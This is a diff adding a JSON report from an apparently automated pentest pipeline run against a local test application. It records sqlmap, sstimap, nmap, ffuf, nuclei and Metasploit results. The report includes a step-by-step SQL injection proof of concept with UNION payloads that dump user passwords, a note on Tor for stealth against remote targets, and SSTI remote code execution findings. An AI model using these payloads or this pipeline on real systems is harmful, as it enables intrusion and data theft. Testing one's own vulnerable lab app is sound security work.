@@ -1,0 +1,107 @@
+{
+  "repo": "test-vuln-app",
+  "repo_url": "/tmp/test-vuln-app",
+  "target_url": "http://127.0.0.1:8099",
+  "target_class": "local",
+  "stealth": "direct \u2014 no Tor for local targets (Arti has no loopback route)",
+  "started": "2026-11-07T03:20:43Z",
+  "duration_s": 402,
+  "strix_run_dir": "/opt/ares/strix/strix_runs/test-vuln-app-final_33ac",
+  "strix_model": "gemini-flash-lite",
+  "strix_seconds": 0,
+  "betterleaks": {
+    "hits": 0,
+    "rc": 0
+  },
+  "strix_findings": [
+    {
+      "title": "SQL Injection in GET /user id parameter (unauthenticated, full table extraction)",
+      "severity": "high",
+      "description": "The `id` query parameter of `GET /user` is interpolated directly into an SQL string via an f-string and executed with `cursor.execute(f\"SELECT * FROM users WHERE id = {uid}\")`. Any unauthenticated client can inject arbitrary SQL, demonstrated by UNION-based extraction of the entire `users` table including password hashes/columns, plus boolean-based and error-based confirmation.",
+      "poc": "1. Start the app locally (`python3 app.py`, binds 127.0.0.1:5000) with a seeded `test.db` containing a `users(id, name, email, password)` table.\n2. Baseline: `GET /user?id=1` returns the row for id 1.\n3. Determine column count with `GET /user?id=1 ORDER BY 5` (500 error) vs ORDER BY 1-4 (200) \u2192 4 columns.\n4. Extract schema: `GET /user?id=1 UNION SELECT 1,sql,3,4 FROM sqlite_master`.\n5. Dump all rows: `GET /user?id=-1 UNION SELECT id,name,email,password FROM users` \u2192 all users including admin password returned.\n6. Boolean confirmation: `GET /user?id=1 AND 1=1` returns a row; `id=1 AND 1=2` returns `[]`.",
+      "target": "/workspace/test-vuln-app-final",
+      "source": "/opt/ares/strix/strix_runs/test-vuln-app-final_33ac/vulnerabilities.json"
+    }
+  ],
+  "endpoints": [
+    "http://127.0.0.1:8099/user?id=1"
+  ],
+  "sqlmap": {
+    "url": "http://127.0.0.1:8099/user?id=1",
+    "injectable": true,
+    "rc": 0,
+    "dbms": "SQLite",
+    "techniques": [
+      "UNION query",
+      "boolean-based blind"
+    ],
+    "dump_rc": 0,
+    "dump_rows": 1,
+    "sensitive_exposed": true,
+    "sample": [
+      "| 1  | flag{super_secret} | admin    |"
+    ],
+    "columns": "| id | secret             | username |"
+  },
+  "sstimap": {
+    "url": "http://127.0.0.1:8099/hello?name=1",
+    "vulnerable": true,
+    "confidence": "high",
+    "engine": "Jinja2",
+    "rce": true,
+    "rc": 0,
+    "via": "sweep"
+  },
+  "xsstrike": {
+    "vectors": 0
+  },
+  "nmap": {
+    "host": "127.0.0.1",
+    "port": 8099,
+    "services": [
+      [
+        "unknown",
+        "1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :"
+      ]
+    ],
+    "rc": 0
+  },
+  "ffuf": {
+    "paths": 1,
+    "found": [
+      "http://127.0.0.1:8099/hello"
+    ],
+    "rc": 0
+  },
+  "nuclei": {
+    "hits": 0,
+    "findings": [],
+    "rc": 0
+  },
+  "metasploit": {
+    "server": "Werkzeug/3.0.1 Python/3.12.3",
+    "module": null,
+    "rc": 0,
+    "candidates": [
+      "exploit/multi/http/werkzeug_debug_rce",
+      "exploit/multi/http/werkzeug_debug_rce"
+    ],
+    "check": "inconclusive",
+    "check_module": "exploit/multi/http/werkzeug_debug_rce"
+  },
+  "sweep": {
+    "candidates": 14,
+    "sstimap_hits": [
+      {
+        "url": "http://127.0.0.1:8099/hello?name=1",
+        "vulnerable": true,
+        "confidence": "high",
+        "engine": "Jinja2",
+        "rce": true,
+        "rc": 0
+      }
+    ],
+    "sstimap_low": [],
+    "xsstrike_hits": []
+  }
+}
